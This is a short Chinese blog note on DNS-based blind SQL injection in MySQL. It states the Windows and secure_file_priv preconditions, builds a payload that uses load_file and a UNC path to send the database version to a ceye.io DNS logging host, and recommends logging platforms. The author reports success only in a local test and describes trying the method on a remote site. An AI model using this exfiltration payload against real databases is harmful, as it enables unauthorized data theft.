---
title: Mysql中的dns盲注
published: 2022-05-13
description: '最近遇到一个存在sql注入的站点，想进一步进行测试。基于时间盲注是可行的，但是效率不高，因此考虑能否使用dns盲注。'
image: ''
tags: ['sql注入']
category: '笔记'
draft: false 
lang: ''
---
* 因原服务器到期，该文章从原服务器迁移至此，图片可能模糊，见谅
# dns盲注条件
> 1. 系统需为windows：dns盲注需要使用Windows支持的UNC路径加载远程文件，linux并不支持UNC路径。
> 2. my.ini配置文件中需存在secure_file_priv=””，没有的话需要添加这项配置。默认是没有的。
> 即show variables like “%secure%”;中secure_file_priv的值为空白（非NULL）。

![](https://impos1.oss-cn-beijing.aliyuncs.com/%7B132913FB-FD27-448E-B97E-3892A4DDCDC5%7D.png)
# 什么是UNC路径
> 我的理解是UNC是用来进行网络共享的一种协议，即主机间相互访问资源。UNC路径格式如下：
> &#92;&#92;servername&#92;sharename，其中servername是服务器名。sharename是共享资源的名称。
# 本地测试
![](https://impos1.oss-cn-beijing.aliyuncs.com/20250827141031.png)
``` sql
id=1' and ()=1%23
id=1' and ( select load_file() )=1%23
id=1' and ( select load_file( concat('',(),'') ) )=1%23
id=1' and ( select load_file( concat('\\\\',(select version()),'.jlx20a.ceye.io') ) )=1%23
``` 
四个‘\’转义后即为&#92;&#92;
![](https://impos1.oss-cn-beijing.aliyuncs.com/%7BC5E4629A-3D71-4524-A42D-49592DA8B0F7%7D.png)
dns平台结果
![](https://impos1.oss-cn-beijing.aliyuncs.com/20250827141146.png)
# 结束
两个比较推荐的dns平台：

> http://www.dnslog.cn/
> http://ceye.io/records/dns


本次测试仅本地测试打通了，因为远程站点是linux服务器，因此没有成功，只能用低效率的延时注入了。如果师傅们有好的方法欢迎交流。